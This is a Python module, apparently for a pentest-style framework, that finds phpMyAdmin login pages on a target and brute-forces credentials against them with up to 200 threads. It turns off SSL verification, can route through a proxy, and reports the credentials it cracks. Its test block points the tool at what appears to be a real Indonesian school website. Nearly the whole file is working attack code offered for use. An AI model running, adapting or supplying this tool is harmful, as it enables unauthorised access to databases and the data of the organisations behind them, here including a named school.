import requests
import threading
import time
from pathlib import Path
import sys
import re
import urllib.parse
from queue import Queue  # <-- INI YANG KAMU LUPA!

# === YAML ===
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

# === SSL WARNING ===
try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

# === TQDM ===
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# === RICH ===
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    from rich.text import Text
    from rich.live import Live
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

MODULE_INFO = {
    "name": "bruteforce/phpmyadmin_ultrafast",
    "description": "Ultra fast phpMyAdmin bruteforce dengan progress bar yang tepat",
    "category": "auxiliary"
}

OPTIONS = {
    "TARGET": {"required": True, "default": "http://localhost/phpmyadmin"},
    "USERNAME": {"required": True, "default": "root"},
    "PASSWORD": {"required": True, "default": "password"},
    "USER_AGENT": {"required": False, "default": "Mozilla/5.0"},
    "THREADS": {"required": False, "default": "50"},
    "DELAY": {"required": False, "default": "0.01"},
    "TIMEOUT": {"required": False, "default": "3"},
    "SSL_VERIFY": {"required": False, "default": "false"},
    "PROXY": {"required": False, "default": ""},
    "MAX_ATTEMPTS": {"required": False, "default": "50000"},
    "CUSTOM": {"required": False, "default": "phpmyadmin_dir.yaml"}
}

def display_header():
    if not RICH_AVAILABLE:
        return
    header_text = Text()
    header_text.append("ULTRA FAST ", style="bold yellow")
    header_text.append("PHPMyAdmin ", style="bold cyan")
    header_text.append("BRUTEFORCE", style="bold green")
    sub_text = Text("High-Speed Credential Testing Tool", style="bold white")
    header_panel = Panel(header_text + "\n" + sub_text, border_style="bright_blue", padding=(1, 2))
    console.print(header_panel)

# ========================================
# TQDM PROGRESS (SATU BARIS HORIZONTAL)
# ========================================
class TqdmProgress:
    def __init__(self):
        self.pbar = None
        self.found = 0
        self.last_path = ""

    def start_scan(self, total):
        if TQDM_AVAILABLE:
            self.pbar = tqdm(
                total=total,
                desc="Scanning paths",
                bar_format="{l_bar}{bar}| {n}/{total} [{elapsed}] {postfix}",
                ncols=80,
                colour=None,
                ascii=False,
                dynamic_ncols=False,
                leave=True
            )
            self.pbar.set_postfix_str("Found: 0")
        else:
            print(f"[*] Scanning {total} paths...")

    def update_scan(self, path=None, status=None):
        if path and status:
            self.found += 1
            self.last_path = f"{path} to {status}"
        if self.pbar:
            self.pbar.set_postfix_str(f"Found: {self.found} | Last: {self.last_path}")
            self.pbar.update(1)

    def start_crack(self, total):
        if self.pbar:
            self.pbar.close()
        if TQDM_AVAILABLE:
            self.pbar = tqdm(
                total=total,
                desc="Cracking",
                bar_format="{l_bar}{bar}| {n}/{total} [{elapsed}] {postfix}",
                ncols=80,
                colour=None,
                ascii=False,
                dynamic_ncols=False,
                leave=True
            )

    def update_crack(self, attempts, speed, eta):
        if self.pbar:
            self.pbar.n = attempts
            self.pbar.set_postfix_str(f"Speed: {speed:,.0f}/s | ETA: {eta:.0f}s")
            self.pbar.refresh()

    def success(self, user, pwd):
        if self.pbar:
            self.pbar.write(f"[SUCCESS] {user}:{pwd}")

    def close(self):
        if self.pbar:
            self.pbar.close()

# ========================================
# SCANNER
# ========================================
class UltraFastTargetScanner:
    def __init__(self, base_target, headers, ssl_verify, timeout, proxies, custom_paths=None):
        self.base_target = base_target.rstrip("/")
        self.headers = headers
        self.ssl_verify = ssl_verify
        self.timeout = timeout
        self.proxies = proxies
        self.found_paths = []
        self.custom_paths = custom_paths or []
        self.progress = TqdmProgress()

    def generate_paths_from_url(self, url):
        all_paths = self.load_paths_from_file("/data/data/com.termux/files/home/S/modules/phpmyadmin/wordlist/phpmyadmin_dir.yaml")
        all_paths.extend(self.custom_paths)
        return list(dict.fromkeys([p.strip() for p in all_paths if p.strip()]))

    def load_paths_from_file(self, filepath):
        if YAML_AVAILABLE and Path(filepath).exists():
            with open(filepath, 'r', encoding='utf-8') as f:
                data = yaml.safe_load(f)
                return [str(p).strip() for p in data if p and str(p).strip()]
        return []

    def check_url_status(self, url):
        try:
            r = requests.get(url, headers=self.headers, verify=self.ssl_verify,
                           timeout=8, proxies=self.proxies, allow_redirects=True)
            html = r.text.lower()
            accessible = r.status_code in [200, 301, 302, 401, 403] or "phpmyadmin" in html
            return {"url": r.url, "status_code": r.status_code, "accessible": accessible}
        except:
            return {"accessible": False}

    def scan_paths(self):
        paths = self.generate_paths_from_url(self.base_target)
        total = len(paths)
        self.progress.start_scan(total)

        for path in paths:
            url = f"{self.base_target}{path or '/'}"
            result = self.check_url_status(url)
            if result["accessible"]:
                self.found_paths.append(result)
                self.progress.update_scan(path or "/", result["status_code"])
            else:
                self.progress.update_scan()
            time.sleep(0.005)

        self.progress.close()
        if self.found_paths and RICH_AVAILABLE:
            self.display_scan_results()
        return self.found_paths

    def display_scan_results(self):
        table = Table(title="Target Discovery Results", box=box.DOUBLE_EDGE)
        table.add_column("Path")
        table.add_column("URL")
        table.add_column("Code")
        for res in self.found_paths:
            table.add_row(res["url"].split(self.base_target)[-1], res["url"][:40], str(res["status_code"]))
        console.print(Panel(table, border_style="green"))

# ========================================
# BRUTEFORCE
# ========================================
class UltraFastPhpMyAdminBruteforce:
    def __init__(self, options):
        self.options = options
        self.credential_queue = Queue()  # SEKARANG SUDAH TERDEFINISI!
        self.results = {"attempts": 0, "found_credentials": [], "start_time": None}
        self.stop_event = threading.Event()
        self.credentials_found = False
        self.progress = TqdmProgress()
        self.setup_components()

    def setup_components(self):
        self.headers = {'User-Agent': self.options.get("USER_AGENT")}
        self.ssl_verify = self.options.get("SSL_VERIFY", "false").lower() == "true"
        self.timeout = int(self.options.get("TIMEOUT", 3))
        self.threads = max(1, min(200, int(self.options.get("THREADS", 50))))
        self.delay = float(self.options.get("DELAY", 0.01))
        self.max_attempts = int(self.options.get("MAX_ATTEMPTS", 50000))
        self.proxies = {"http": self.options.get("PROXY"), "https": self.options.get("PROXY")} if self.options.get("PROXY") else {}
        self.load_credentials_to_queue()

    def load_credentials_to_queue(self):
        usernames = self.load_wordlist(self.options.get("USERNAME"))
        passwords = self.load_wordlist(self.options.get("PASSWORD"))
        total = 0
        for u in usernames:
            for p in passwords:
                if total >= self.max_attempts:
                    break
                self.credential_queue.put((u, p))
                total += 1
        self.total_attempts = total

    def load_wordlist(self, inp):
        if Path(inp).is_file():
            with open(inp, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        return [inp]

    def run(self):
        display_header()
        scanner = UltraFastTargetScanner(
            self.options.get("TARGET"), self.headers, self.ssl_verify,
            self.timeout, self.proxies
        )
        found_paths = scanner.scan_paths()
        if not found_paths:
            return
        target_url = found_paths[0]["url"]
        self.start_bruteforce_with_proper_progress(target_url)
        self.display_final_results()

    def start_bruteforce_with_proper_progress(self, target_url):
        print(f"Target Locked: {target_url}")
        self.progress.start_crack(self.total_attempts)
        self.results["start_time"] = time.time()
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.bruteforce_worker, args=(target_url,))
            t.daemon = True
            t.start()
            threads.append(t)

        last_attempts = 0
        last_time = time.time()
        try:
            while not self.stop_event.is_set() and self.results["attempts"] < self.total_attempts:
                time.sleep(0.5)
                now = time.time()
                diff = now - last_time
                if diff > 0:
                    speed = (self.results["attempts"] - last_attempts) / diff
                    eta = (self.total_attempts - self.results["attempts"]) / speed if speed > 0 else 0
                    self.progress.update_crack(self.results["attempts"], speed, eta)
                last_attempts = self.results["attempts"]
                last_time = now
        except KeyboardInterrupt:
            self.stop_event.set()

        for t in threads:
            t.join(timeout=2)
        self.progress.close()

    def bruteforce_worker(self, target_url):
        session = requests.Session()
        session.headers.update(self.headers)
        while not self.stop_event.is_set() and not self.credential_queue.empty():
            username, password = self.credential_queue.get()
            if self.try_login(session, target_url, username, password):
                with threading.Lock():
                    self.results["found_credentials"].append((username, password))
                    self.credentials_found = True
                    self.stop_event.set()
                    self.progress.success(username, password)
            with threading.Lock():
                self.results["attempts"] += 1
            time.sleep(self.delay)
            self.credential_queue.task_done()

    def try_login(self, session, target_url, username, password):
        try:
            data = {'pma_username': username, 'pma_password': password, 'server': '1'}
            r = session.post(f"{target_url}/index.php", data=data, timeout=2, verify=False)
            return "navigation.php" in r.text or "main.php" in r.text
        except:
            return False

    def display_final_results(self):
        if self.results["found_credentials"]:
            console.print(Panel(f"[SUCCESS] {self.results['found_credentials'][0][0]}:{self.results['found_credentials'][0][1]}", border_style="green"))
        else:
            console.print(Panel("No credentials found", border_style="red"))

# ========================================
# MAIN
# ========================================
def run(session, options):
    bruteforcer = UltraFastPhpMyAdminBruteforce(options)
    bruteforcer.run()

# === TEST ===
if __name__ == "__main__":
    test_options = {
        "TARGET": "https://sman1dramaga.sch.id",
        "USERNAME": "root",
        "PASSWORD": "password",
        "CUSTOM": "phpmyadmin_dir.yaml"
    }
    run(None, test_options)
